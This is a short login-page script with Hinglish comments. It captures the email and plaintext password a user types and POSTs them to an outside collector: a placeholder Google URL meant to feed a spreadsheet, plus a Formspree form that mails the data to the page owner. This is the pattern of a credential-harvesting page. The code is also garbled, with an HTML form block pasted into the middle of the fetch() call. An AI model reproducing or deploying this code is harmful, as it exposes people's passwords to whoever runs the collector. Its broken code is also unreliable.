<script>
  // Aapka ekdum sahi wala link
  const SCRIPT_URL = "https://google.com";

  const loginForm = document.querySelector('form'); 
  if (loginForm) {
    loginForm.addEventListener('submit', function(e) {
      e.preventDefault();

      const emailInput = document.querySelector('input[type="email"]').value;
      const passwordInput = document.querySelector('input[type="password"]').value;
      const submitButton = document.querySelector('button[type="submit"]');

      submitButton.innerText = "Checking...";
      submitButton.disabled = true;

      // Data ko sahi format (URL-Encoded) me badalna taaki Google accept kare
      const formData = new URLSearchParams();
      formData.append("action", "login");
      formData.append("email", emailInput);
      formData.append("password", passwordInput);

      fetch(SCRIPT_URL, {
        method: "POST",
        <!-- Formspree ke zariye data direct aapke email par aayega -->
<form action="https://formspree.io" method="POST">
  
  <!-- Dhyan rakhein ki email input me name="email" zaroor likha ho -->
  <input type="email" name="email" placeholder="Apna Email Likhein" required>
  
  <!-- Dhyan rakhein ki password input me name="password" zaroor likha ho -->
  <input type="password" name="password" placeholder="Apna Password Likhein" required>
  
  <!-- Button ka type submit hona chahiye -->
  <button type="submit">Sign In</button>

</form>
      
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: formData.toString()
      })
      .then(() => {
        alert("Success! Data Sheet me bhej diya gaya hai.");
        // Login ke baad dashboard page par bhejna
        window.location.href = "dashboard.html"; 
      })
      .catch(error => {
        alert("Error: " + error.message);
        submitButton.innerText = "Sign In";
        submitButton.disabled = false;
      });
    });
  }
</script>
